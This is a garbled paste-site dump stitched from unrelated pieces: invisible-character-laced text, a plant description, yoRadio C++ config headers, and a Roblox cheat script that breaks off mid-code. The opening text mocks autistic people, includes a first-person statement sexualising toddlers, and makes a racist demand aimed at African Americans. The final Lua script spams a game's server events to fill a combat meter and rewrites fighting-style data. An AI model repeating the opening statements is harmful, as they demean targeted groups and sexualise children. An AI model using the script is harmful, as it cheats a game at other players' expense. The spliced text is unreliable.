‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äéa‚Äén‚Äéi‚Äém‚Äéu‚Äé ‚Äéo‚Äér‚Äé ‚Äév‚Äéi‚Äéd‚Äée‚Äéo‚Äé ‚Äég‚Äéa‚Äém‚Äée‚Äés‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéb‚Äér‚Äée‚Äéa‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äéu‚Äét‚Äé ‚Äéi‚Äén‚Äét‚Äéo‚Äé ‚Äéf‚Äéi‚Äét‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéS‚Äét‚Äér‚Äée‚Äés‚Äés‚Äé‚Ñ¢‚Äé ‚Äéw‚Äéh‚Äée‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äés‚Äét‚Äér‚Äéi‚Äéc‚Äét‚Äé ‚Äér‚Äéo‚Äéu‚Äét‚Äéi‚Äén‚Äée‚Äés‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äéb‚Äér‚Äéo‚Äék‚Äée‚Äén‚Äé ‚Äéo‚Äér‚Äé ‚Äéw‚Äéh‚Äée‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äéy‚Äé'‚Äér‚Äée‚Äé ‚Äéa‚Äés‚Äék‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äés‚Äét‚Äéo‚Äép‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äél‚Äéa‚Äéz‚Äéy‚Äé,‚Äé ‚Äés‚Äée‚Äél‚Äéf‚Äé-‚Äés‚Äée‚Äér‚Äév‚Äéi‚Äén‚Äég‚Äé ‚Äél‚Äée‚Äée‚Äéc‚Äéh‚Äée‚Äés‚Äé ‚Äél‚Äéi‚Äév‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äéf‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äég‚Äéo‚Äév‚Äée‚Äér‚Äén‚Äém‚Äée‚Äén‚Äét‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äép‚Äéa‚Äér‚Äée‚Äén‚Äét‚Äés‚Äé.‚Äé


(‚Äé(‚Äé ‚ÄéE‚ÄéD‚Äé'‚ÄéS‚Äé ‚ÄéM‚ÄéO‚ÄéN‚ÄéT‚ÄéH‚Äé ‚ÄéO‚ÄéF‚Äé ‚ÄéA‚ÄéU‚ÄéT‚ÄéI‚ÄéS‚ÄéM‚Äé ‚ÄéC‚ÄéE‚ÄéL‚ÄéE‚ÄéB‚ÄéR‚ÄéA‚ÄéT‚ÄéI‚ÄéO‚ÄéN‚Äé ‚Äé)‚Äé)‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

B‚Äéi‚Äés‚Äét‚Äéo‚Äér‚Äét‚Äéa‚Äé ‚Äéo‚Äéf‚Äéf‚Äéi‚Äéc‚Äéi‚Äén‚Äéa‚Äél‚Äéi‚Äés‚Äé,‚Äé ‚Äéa‚Äél‚Äés‚Äéo‚Äé ‚Äék‚Äén‚Äéo‚Äéw‚Äén‚Äé ‚Äéa‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéo‚Äém‚Äém‚Äéo‚Äén‚Äé ‚Äéb‚Äéi‚Äés‚Äét‚Äéo‚Äér‚Äét‚Äé,‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äé ‚Äés‚Äép‚Äée‚Äéc‚Äéi‚Äée‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äéf‚Äél‚Äéo‚Äéw‚Äée‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äép‚Äél‚Äéa‚Äén‚Äét‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéd‚Äéo‚Äéc‚Äék‚Äé ‚Äéf‚Äéa‚Äém‚Äéi‚Äél‚Äéy‚Äé ‚ÄéP‚Äéo‚Äél‚Äéy‚Äég‚Äéo‚Äén‚Äéa‚Äéc‚Äée‚Äéa‚Äée‚Äé.‚Äé ‚ÄéI‚Äét‚Äé ‚Äéi‚Äés‚Äé ‚Äén‚Äéa‚Äét‚Äéi‚Äév‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚ÄéE‚Äéu‚Äér‚Äéo‚Äép‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äén‚Äéo‚Äér‚Äét‚Äéh‚Äée‚Äér‚Äén‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéw‚Äée‚Äés‚Äét‚Äée‚Äér‚Äén‚Äé ‚ÄéA‚Äés‚Äéi‚Äéa‚Äé,‚Äé ‚Äéb‚Äéu‚Äét‚Äé ‚Äéh‚Äéa‚Äés‚Äé ‚Äéa‚Äél‚Äés‚Äéo‚Äé ‚Äéb‚Äée‚Äée‚Äén‚Äé ‚Äéc‚Äéu‚Äél‚Äét‚Äéi‚Äév‚Äéa‚Äét‚Äée‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéb‚Äée‚Äéc‚Äéo‚Äém‚Äée‚Äé ‚Äén‚Äéa‚Äét‚Äéu‚Äér‚Äéa‚Äél‚Äéi‚Äéz‚Äée‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äép‚Äéa‚Äér‚Äét‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéw‚Äéo‚Äér‚Äél‚Äéd‚Äé ‚Äés‚Äéu‚Äéc‚Äéh‚Äé ‚Äéa‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéU‚Äén‚Äéi‚Äét‚Äée‚Äéd‚Äé ‚ÄéS‚Äét‚Äéa‚Äét‚Äée‚Äés‚Äé.‚Äé ‚ÄéI‚Äét‚Äé ‚Äéi‚Äés‚Äé ‚Äét‚Äéy‚Äép‚Äéi‚Äéc‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéf‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚Äég‚Äér‚Äéo‚Äéw‚Äéi‚Äén‚Äég‚Äé ‚Äéi‚Äén‚Äé ‚Äém‚Äéo‚Äéi‚Äés‚Äét‚Äé ‚Äém‚Äée‚Äéa‚Äéd‚Äéo‚Äéw‚Äés‚Äé,‚Äé ‚Äén‚Äéu‚Äét‚Äér‚Äéi‚Äée‚Äén‚Äét‚Äé-‚Äér‚Äéi‚Äéc‚Äéh‚Äé ‚Äéw‚Äéo‚Äéo‚Äéd‚Äée‚Äéd‚Äé ‚Äés‚Äéw‚Äéa‚Äém‚Äép‚Äés‚Äé,‚Äé ‚Äéf‚Äéo‚Äér‚Äée‚Äés‚Äét‚Äé ‚Äée‚Äéd‚Äég‚Äée‚Äés‚Äé,‚Äé ‚Äéw‚Äée‚Äét‚Äél‚Äéa‚Äén‚Äéd‚Äés‚Äé,‚Äé ‚Äép‚Äéa‚Äér‚Äék‚Äés‚Äé,‚Äé ‚Äég‚Äéa‚Äér‚Äéd‚Äée‚Äén‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéd‚Äéi‚Äés‚Äét‚Äéu‚Äér‚Äéb‚Äée‚Äéd‚Äé ‚Äég‚Äér‚Äéo‚Äéu‚Äén‚Äéd‚Äé.‚Äé ‚ÄéA‚Äé ‚Äéh‚Äée‚Äér‚Äéb‚Äéa‚Äéc‚Äée‚Äéo‚Äéu‚Äés‚Äé ‚Äép‚Äée‚Äér‚Äée‚Äén‚Äén‚Äéi‚Äéa‚Äél‚Äé,‚Äé ‚Äéi‚Äét‚Äé ‚Äég‚Äér‚Äéo‚Äéw‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äéa‚Äé ‚Äéh‚Äée‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äé2‚Äé0‚Äé ‚Äét‚Äéo‚Äé ‚Äé8‚Äé0‚Äé ‚Äéc‚Äée‚Äén‚Äét‚Äéi‚Äém‚Äée‚Äét‚Äér‚Äée‚Äés‚Äé ‚Äé(‚Äé8‚Äé ‚Äét‚Äéo‚Äé ‚Äé3‚Äé1‚Äé ‚Äéi‚Äén‚Äéc‚Äéh‚Äée‚Äés‚Äé)‚Äé.‚Äé ‚ÄéI‚Äét‚Äé ‚Äéb‚Äél‚Äéo‚Äéo‚Äém‚Äés‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äél‚Äéa‚Äét‚Äée‚Äé ‚Äés‚Äép‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äéi‚Äén‚Äét‚Äéo‚Äé ‚Äéa‚Äéu‚Äét‚Äéu‚Äém‚Äén‚Äé,‚Äé ‚Äép‚Äér‚Äéo‚Äéd‚Äéu‚Äéc‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéa‚Äél‚Äél‚Äé,‚Äé ‚Äée‚Äér‚Äée‚Äéc‚Äét‚Äé,‚Äé ‚Äéu‚Äén‚Äéb‚Äér‚Äéa‚Äén‚Äéc‚Äéh‚Äée‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéh‚Äéa‚Äéi‚Äér‚Äél‚Äée‚Äés‚Äés‚Äé ‚Äés‚Äét‚Äée‚Äém‚Äés‚Äé ‚Äée‚Äén‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äéi‚Äén‚Äé ‚Äés‚Äéi‚Äén‚Äég‚Äél‚Äée‚Äé ‚Äét‚Äée‚Äér‚Äém‚Äéi‚Äén‚Äéa‚Äél‚Äé ‚Äér‚Äéa‚Äéc‚Äée‚Äém‚Äée‚Äés‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äéc‚Äél‚Äéu‚Äéb‚Äé-‚Äél‚Äéi‚Äék‚Äée‚Äé ‚Äés‚Äép‚Äéi‚Äék‚Äée‚Äés‚Äé,‚Äé ‚Äé5‚Äé ‚Äét‚Äéo‚Äé ‚Äé7‚Äé ‚Äéc‚Äée‚Äén‚Äét‚Äéi‚Äém‚Äée‚Äét‚Äér‚Äée‚Äés‚Äé ‚Äé(‚Äé2‚Äé ‚Äét‚Äéo‚Äé ‚Äé3‚Äé ‚Äéi‚Äén‚Äéc‚Äéh‚Äée‚Äés‚Äé)‚Äé ‚Äél‚Äéo‚Äén‚Äég‚Äé,‚Äé ‚Äéo‚Äéf‚Äé ‚Äér‚Äéo‚Äés‚Äée‚Äé-‚Äép‚Äéi‚Äén‚Äék‚Äé ‚Äéf‚Äél‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé.‚Äé ‚ÄéT‚Äéh‚Äéi‚Äés‚Äé ‚ÄéB‚Äé.‚Äé ‚Äéo‚Äéf‚Äéf‚Äéi‚Äéc‚Äéi‚Äén‚Äéa‚Äél‚Äéi‚Äés‚Äé ‚Äéi‚Äén‚Äéf‚Äél‚Äéo‚Äér‚Äée‚Äés‚Äéc‚Äée‚Äén‚Äéc‚Äée‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äép‚Äéh‚Äéo‚Äét‚Äéo‚Äég‚Äér‚Äéa‚Äép‚Äéh‚Äée‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéA‚Äéu‚Äés‚Äét‚Äér‚Äéi‚Äéa‚Äén‚Äé ‚ÄéA‚Äél‚Äép‚Äés‚Äé.‚Äé

P‚Äéh‚Äéo‚Äét‚Äéo‚Äég‚Äér‚Äéa‚Äép‚Äéh‚Äé ‚Äéc‚Äér‚Äée‚Äéd‚Äéi‚Äét‚Äé:‚Äé ‚ÄéU‚Äéo‚Äéa‚Äée‚Äéi‚Äé1‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

H‚Äée‚Äél‚Äél‚Äéo‚Äé ‚ÄéI‚Äé ‚Äéa‚Äém‚Äé ‚ÄéN‚Äéo‚Äéo‚Äéz‚Äée‚Äéc‚Äéa‚Äés‚Äét‚Äée‚Äér‚Äé ‚ÄéN‚Äée‚Äéd‚Äé.‚Äé ‚ÄéI‚Äé ‚Äél‚Äéi‚Äék‚Äée‚Äé ‚Äét‚Äéo‚Äéd‚Äéd‚Äél‚Äée‚Äér‚Äés‚Äé ‚Äép‚Äéo‚Äéo‚Äép‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äén‚Äé ‚Äém‚Äéy‚Äé ‚Äéd‚Äéi‚Äéc‚Äék‚Äé.‚Äé ‚ÄéD‚Äéa‚Äém‚Äén‚Äé ‚Äét‚Äéo‚Äéd‚Äéd‚Äél‚Äée‚Äér‚Äés‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äés‚Äéo‚Äé ‚Äés‚Äée‚Äéx‚Äéy‚Äé.‚Äé ‚ÄéI‚Äé'‚Äém‚Äé ‚Äég‚Äéo‚Äén‚Äén‚Äéa‚Äé ‚Äég‚Äéo‚Äé ‚Äéh‚Äéa‚Äév‚Äée‚Äé ‚Äés‚Äée‚Äéx‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äé ‚Äét‚Äéo‚Äéd‚Äéd‚Äél‚Äée‚Äér‚Äés‚Äé ‚Äér‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚Äén‚Äéo‚Äéw‚Äé.‚Äé ‚ÄéA‚Äén‚Äéy‚Äéw‚Äéa‚Äéy‚Äé,‚Äé ‚Äéo‚Äén‚Äéc‚Äée‚Äé ‚ÄéI‚Äé ‚Äéd‚Äéo‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé,‚Äé ‚ÄéI‚Äé'‚Äém‚Äé ‚Äég‚Äéo‚Äén‚Äén‚Äéa‚Äé ‚Äég‚Äéo‚Äé ‚Äéy‚Äée‚Äél‚Äél‚Äé ‚Äéa‚Äét‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äé ‚ÄéA‚Äéf‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äé ‚ÄéA‚Äém‚Äée‚Äér‚Äéi‚Äéc‚Äéa‚Äén‚Äés‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äée‚Äél‚Äél‚Äé ‚Äét‚Äéh‚Äée‚Äém‚Äé ‚Äét‚Äéo‚Äé ‚Äér‚Äée‚Äét‚Äéu‚Äér‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äéo‚Äéw‚Äén‚Äé ‚Äéc‚Äéo‚Äéu‚Äén‚Äét‚Äér‚Äéy‚Äé.‚Äé"
VE9KpQT6,mytheme.h file for yoRadio - ST7789 - PCM5102A - IR remote,LeventeDaradici,C++,Tuesday 23rd of April 2024 08:43:33 AM CDT,"// File created with YoRadio Theme Editor created by Andr√°s Daradics
// File last modified: 4/19/2024 12:20:37 AM
// GitHub: https://github.com/andrasdaradici/YoRadio-Theme-Editor
// Itch.io: https://andrasdaradici.itch.io/yoradio-theme-editor
#ifndef _my_theme_h
#define _my_theme_h

#define ENABLE_THEME
#ifdef  ENABLE_THEME

#define COLOR_BACKGROUND     0,  0,  0
#define COLOR_STATION_NAME     255,  255,  255
#define COLOR_STATION_BG    0,  0,  255
#define COLOR_STATION_FILL    0,  0,  255
#define COLOR_SNG_TITLE_1    255,  255,  0
#define COLOR_SNG_TITLE_2    255,  55,  170
#define COLOR_WEATHER    0,  255,  243
#define COLOR_VU_MAX    255,  93,  0
#define COLOR_VU_MIN    0,  255,  56
#define COLOR_CLOCK    255,  255,  255
#define COLOR_CLOCK_BG    20,  20,  20
#define COLOR_SECONDS    255,  0,  255
#define COLOR_DAY_OF_W    0,  91,  255
#define COLOR_DATE    0,  255,  0
#define COLOR_BUFFER    0,  95,  255
#define COLOR_IP    41,  189,  207
#define COLOR_VOLUME_VALUE    165,  162,  132
#define COLOR_RSSI    255,  148,  156
#define COLOR_VOLBAR_OUT    198,  237,  0
#define COLOR_VOLBAR_IN    0,  52,  255
#define COLOR_DIGITS    100, 100, 255
#define COLOR_DIVIDER    255,  255,  255
#define COLOR_BITRATE    255,  255,  255
#define COLOR_HEAP    255, 168, 162
#define COLOR_PL_CURRENT    0, 0, 0
#define COLOR_PL_CURRENT_BG    91, 118, 255
#define COLOR_PL_CURRENT_FILL    91, 118, 255
#define COLOR_PLAYLIST_0    255, 0, 0
#define COLOR_PLAYLIST_1    0, 255, 0
#define COLOR_PLAYLIST_2    255, 0, 255
#define COLOR_PLAYLIST_3    0, 0, 255
#define COLOR_PLAYLIST_4    0, 255, 255


#endif
#endif
"
Lcb0k4rY,myoptions.h file for yoRadio - ST7789 - PCM5102A - IR remote,LeventeDaradici,C++,Tuesday 23rd of April 2024 08:39:36 AM CDT,"#ifndef myoptions_h
#define myoptions_h

/* https://www.youtube.com/@LeventeDaradici/videos
/* https://youtu.be/48McDlKZ_2c

/* Generated by myoptions.h generator - v0.8.1 */
/* https://e2002.github.io/docs/myoptions-generator.html?r=71,2,14,41,43&i=1,2,3,4,15,16,17&v=4,5,-1,255,27,26,25 */
/* Put this file next to yoRadio.ino and restart Arduino IDE. */

/* !!! Attention !!! */
/* This configuration depends on some additional libraries. Please install them using the library manager: */
/* Adafruit GFX Library, Adafruit ST7735 and ST7789 Library */

/* !!! Do not be alarmed, all right, the default values ‚Äã‚Äãare not included in this file !!! */

#define DSP_MODEL			DSP_ST7789

#define IR_PIN                15
#define IR_TIMEOUT            80    

#endif
"
6L4rvKc9,Legend style,Dsaqwed123,LScript,Tuesday 23rd of April 2024 08:05:51 AM CDT,"local sound = Instance.new(""Sound"")
sound.SoundId = ""rbxassetid://9426968107"" -- 9426968107
sound.Looped = true
sound.Parent = workspace
sound.Volume = 0.6
sound:Play()
getfenv().Activated = true

local function FillHeat()
    local Event = game:GetService(""ReplicatedStorage"").Events.ME

    for i=1,6 do
        local A_1 =  {
            [1] = ""heat"", 
            [2] = game:GetService(""ReplicatedStorage"").Moves.Taunt
        }
        Event:FireServer(A_1)
    end
end

spawn(function()
    while true do
        task.wait()
        if not Activated then break end
        FillHeat()
    end
end)

local plr = game.Players.LocalPlayer
local pgui = plr.PlayerGui
local interf = pgui.Interface
local bt = interf.Battle
local main = bt.Main

local menu = pgui.MenuUI.Menu 
local abil = menu.Abilities.Frame.Frame.Frame
                                              
if game.ReplicatedStorage.Styles:FindFirstChild(""Brawler"") then
v = game.ReplicatedStorage.Styles[""Brawler""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles)
end                          
v.Name = ""Brawler""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GunStandingShotgun"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GunStandingShotgun""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_ShotStopperShotgun'
v.Name = ""H_GunStandingShotgun""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush1"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'ÈæçAttack1'
v.Name = ""Rush1""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush2"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'ÈæçAttack2'
v.Name = ""Rush2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Speed"") then
v = game.ReplicatedStorage.Styles.Brawler[""Speed""]
else
v = Instance.new(""NumberValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 1.9
v.Name = ""Speed""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Color"") then
v = game.ReplicatedStorage.Styles.Brawler[""Color""]
else
v = Instance.new(""Color3Value"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = Color3.fromRGB(241, 240, 234)
v.Name = ""Color""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike1"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike1""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'ÈæçStrike1'
v.Name = ""Strike1""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush3"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'ÈæçAttack3'
v.Name = ""Rush3""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_LowHealthFallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_LowHealthFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_FallenFinisher'
v.Name = ""H_LowHealthFallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""LThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""LThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_LegToss'
v.Name = ""LThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_FullStunned"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_FullStunned""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_GUltimateEssence'
v.Name = ""H_FullStunned""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Rush4"") then
v = game.ReplicatedStorage.Styles.Brawler[""Rush4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'ÈæçAttack4'
v.Name = ""Rush4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike2"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BStrike2'
v.Name = ""Strike2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike3"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BStrike3'
v.Name = ""Strike3""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike4"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BStrike5'
v.Name = ""Strike4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Strike5"") then
v = game.ReplicatedStorage.Styles.Brawler[""Strike5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'ÈæçStrike5'
v.Name = ""Strike5""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Grab"") then
v = game.ReplicatedStorage.Styles.Brawler[""Grab""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'GGrab'
v.Name = ""Grab""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""BlockStrike"") then
v = game.ReplicatedStorage.Styles.Brawler[""BlockStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'TigerDrop'
v.Name = ""BlockStrike""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_BackWall"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_BackWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_WallSmashing'
v.Name = ""H_BackWall""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_CounterSolo"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_CounterSolo""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_Escape'
v.Name = ""H_CounterSolo""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""RedHeat"") then
v = game.ReplicatedStorage.Styles.Brawler[""RedHeat""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler)
end
v.Name = ""RedHeat""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""GrabStrike"") then
v = game.ReplicatedStorage.Styles.Brawler[""GrabStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_GuruParry'
v.Name = ""GrabStrike""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""StanceStrike"") then
v = game.ReplicatedStorage.Styles.Brawler[""StanceStrike""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'TigerDrop'
v.Name = ""StanceStrike""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""StrikeThrow"") then
v = game.ReplicatedStorage.Styles.Brawler[""StrikeThrow""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_FinishingHold'
v.Name = ""StrikeThrow""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_StanceFallen"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_StanceFallen""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_HeadPressUp'
v.Name = ""H_StanceFallen""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""VisualName"") then
v = game.ReplicatedStorage.Styles.Brawler[""VisualName""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'Legend'
v.Name = ""VisualName""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""Throw"") then
v = game.ReplicatedStorage.Styles.Brawler[""Throw""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'T_BeastToss'
v.Name = ""Throw""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""DoubleBlows"") then
v = game.ReplicatedStorage.Styles.Brawler[""DoubleBlows""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler)
end
v.Name = ""DoubleBlows""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike4"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike4""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'Èæç2Strike3'
v.Name = ""2Strike4""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike2"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike2""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'Èæç2Strike1'
v.Name = ""2Strike2""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike3"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike3""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'Èæç2Strike2'
v.Name = ""2Strike3""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""2Strike5"") then
v = game.ReplicatedStorage.Styles.Brawler[""2Strike5""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'Èæç2Strike4'
v.Name = ""2Strike5""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""H_GrabOnWall"") then
v = game.ReplicatedStorage.Styles.Brawler[""H_GrabOnWall""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'H_WallSmack'
v.Name = ""H_GrabOnWall""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""GrabCorpses"") then
v = game.ReplicatedStorage.Styles.Brawler[""GrabCorpses""]
else
v = Instance.new(""Folder"", game.ReplicatedStorage.Styles.Brawler)
end
v.Name = ""GrabCorpses""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeB"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeB""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeBack'
v.Name = ""EvadeStrikeB""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeF"") then
v = game.ReplicatedStorage.Styles.Brawler[""EvadeStrikeF""]
else
v = Instance.new(""StringValue"", game.ReplicatedStorage.Styles.Brawler)
end
v.Value = 'BEvadeStrikeForward'
v.Name = ""EvadeStrikeF""
if game.ReplicatedStorage.Styles.Brawler:FindFirstChild(""EvadeStrikeL"") then
